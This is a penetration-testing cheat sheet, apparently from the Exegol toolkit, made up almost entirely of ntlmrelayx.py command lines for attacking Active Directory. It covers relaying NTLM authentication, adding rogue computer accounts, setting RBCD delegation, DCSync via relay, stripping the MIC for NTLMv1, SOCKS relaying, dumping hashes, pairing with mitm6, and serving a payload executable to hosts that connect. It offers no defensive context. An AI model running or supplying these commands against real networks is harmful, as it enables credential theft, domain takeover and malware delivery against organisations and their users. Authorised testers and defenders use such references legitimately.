# ntlmrelayx

% NTLM, ntlmrelayx, relay

## NTLM relay
#assessment/AD #attack_type/Coerce_Relay #port/445 #port/139 #protocol/smb #access/Anonymous

Relay NTLM authentication to a remote target.

```bash
ntlmrelayx.py -t <target-ip> -smb2support
```

## Add a computer account to the domain
#assessment/AD  #target/remote #cat/ATTACK/MITM 

Relay authentication to add a computer to the domain.

⚠️ Requirement : Attribute ms-DS-MachineAccountQuota must at least be 1 for the current user (or all users)

```bash
ntlmrelayx.py -t ldaps://<dc-ip> --add-computer <computer_name> <computer_password> --delegate-access
```

## Set a computer account attribute for S4U2/RBCD
#assessment/AD  #target/remote #cat/ATTACK/MITM 

Set the ms-DS-AllowedToActOnBehalfOfOtherIdentity attribute of a controlled computer account to impersonate the relayed account. Used in S4U2self / S4U2Proxy / RBCD attacks.

```bash
ntlmrelayx.py -t ldaps://<dc-ip> --escalate-user <computer_name> --delegate-access
```

## DCsync


```bash
ntlmrelayx.py -t dcsync://<dc-ip> -smb2support
```

## ntlmrelayx add machine ntlmv1
#assessment/AD  #target/remote #cat/ATTACK/MITM 
```bash
ntlmrelayx.py -t ldaps://<dc-ip> -smb2support --remove-mic --add-computer <machine_name> <machine_password> --delegate-access
```

## ntlmrelay - host a payload that will automatically be served to the remote host connecting
#assessment/AD #target/serve #cat/ATTACK/MITM 

```bash
ntlmrelayx.py -tf <targets_file> -smb2support -e <payload_file|payload.exe>
```

## ntlmrelay - socks
#assessment/AD #target/serve #cat/ATTACK/MITM 
```bash
ntlmrelayx.py -tf <targets_file> -socks -smb2support
```

## ntlmrelay - authenticate and dump hash
#assessment/AD #target/serve #cat/ATTACK/MITM 
```bash
ntlmrelayx.py -tf <targets_file> -smb2support
```

## ntlmrelay - to use with mitm6 - relay to target
#assessment/AD #target/serve #cat/ATTACK/MITM 
Next use the socks with proxychains : 
proxychains smbclient //ip/Users -U domain/user

```bash
ntlmrelayx.py -6 -wh <attacker_ip> -t smb://<target> -l /tmp -socks -debug
```

## ntlmrelay - to use with mitm6 - delegate access
#assessment/AD #target/serve #cat/ATTACK/MITM 
```bash
ntlmrelayx.py -t ldaps://<dc_ip> -wh <attacker_ip> --delegate-access
```

= shareName: EXEGOL
= sharePath: .
